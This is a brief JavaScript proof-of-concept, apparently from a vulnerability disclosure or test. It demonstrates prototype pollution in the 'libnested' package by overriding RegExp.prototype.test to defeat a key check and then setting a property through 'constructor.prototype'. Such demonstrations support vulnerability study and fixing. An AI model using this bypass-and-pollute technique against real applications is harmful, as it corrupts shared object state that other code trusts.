RegExp.prototype.test = () => false;
console.log({}.polluted);
const libnested = require('libnested');
libnested.set({}, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);